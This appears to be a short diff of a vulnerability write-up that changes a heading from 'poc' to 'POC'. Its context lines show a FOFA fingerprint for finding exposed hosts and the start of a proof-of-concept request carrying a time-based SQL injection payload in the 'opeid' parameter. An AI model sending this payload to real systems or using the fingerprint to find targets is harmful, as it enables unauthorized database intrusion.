@@ -8,7 +8,7 @@
 FOFA：body="wx8ccb75857bd3e985"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /MyDown/MyImportData?opeid=1%27+WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
